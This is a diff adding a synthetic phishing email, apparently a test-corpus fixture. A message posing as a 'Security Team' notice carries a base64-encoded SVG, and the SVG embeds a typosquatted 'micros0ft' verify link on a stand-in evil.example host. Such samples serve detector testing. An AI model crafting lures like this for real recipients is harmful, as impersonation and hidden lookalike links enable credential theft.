@@ -1,0 +1,24 @@
+From: Security Team <sender@evil.example>
+To: recipient@victim.example
+Date: Wed, 13 Aug 2026 12:00:00 +0000
+Subject: Embedded account notice
+Message-ID: <msg-1859-svg-01@corpus.phishing.test>
+MIME-Version: 1.0
+Content-Type: multipart/related; boundary="msg1859-svg-boundary"
+
+--msg1859-svg-boundary
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+<html><body><p>Please review the embedded notice.</p><img src="cid:notice@phishing.test" alt="Account notice"></body></html>
+--msg1859-svg-boundary
+Content-Type: image/svg+xml
+Content-Transfer-Encoding: base64
+Content-ID: <notice@phishing.test>
+Content-Disposition: inline; filename="notice.svg"
+
+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMDAiIGhlaWdo
+dD0iNjAiPgogIDxmb3JlaWduT2JqZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGRhdGE9
+Imh0dHBzOi8vbWljcm9zMGZ0LmV2aWwuZXhhbXBsZS5jb20vbWljcm9zb2Z0L3ZlcmlmeSI+CiAg
+PC9mb3JlaWduT2JqZWN0Pgo8L3N2Zz4=
+--msg1859-svg-boundary--
